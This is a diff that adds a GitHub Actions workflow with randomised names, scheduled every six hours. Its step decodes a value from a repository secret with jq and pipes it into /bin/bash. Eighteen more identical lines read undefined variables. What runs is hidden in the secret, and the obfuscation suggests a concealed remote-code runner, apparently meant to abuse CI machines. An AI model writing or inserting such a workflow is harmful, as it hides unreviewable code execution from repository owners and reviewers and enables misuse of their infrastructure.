@@ -1,0 +1,36 @@
+name: jianlianjiaoyulu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jianlianjiaoyulu
+        env:
+          r14714: ${{ secrets.r14714 }}
+        run: |
+          echo $r14714 | jq -r .focwm5523 | /bin/bash
+          echo $rzxmw1644 | jq -r .hyef766 | /bin/bash
+          echo $j3 | jq -r .cat3531 | /bin/bash
+          echo $mvnf61961 | jq -r .dvhp70 | /bin/bash
+          echo $vdza19 | jq -r .euoaj8 | /bin/bash
+          echo $sxq02 | jq -r .hvoi62525 | /bin/bash
+          echo $yapfn42594 | jq -r .bagk3 | /bin/bash
+          echo $xqzrp03788 | jq -r .akakt0462 | /bin/bash
+          echo $kiet272 | jq -r .fsybx0240 | /bin/bash
+          echo $tnoda4377 | jq -r .hgj5816 | /bin/bash
+          echo $hxotj49166 | jq -r .kr64 | /bin/bash
+          echo $azobu00 | jq -r .kvd53524 | /bin/bash
+          echo $sc52 | jq -r .zuq24 | /bin/bash
+          echo $zqenv3 | jq -r .bnx1789 | /bin/bash
+          echo $c1210 | jq -r .srm6708 | /bin/bash
+          echo $qiu459 | jq -r .uinka71701 | /bin/bash
+          echo $ej75600 | jq -r .nz1482 | /bin/bash
+          echo $wc07691 | jq -r .b753 | /bin/bash
+          echo $t737 | jq -r .zo02843 | /bin/bash
+
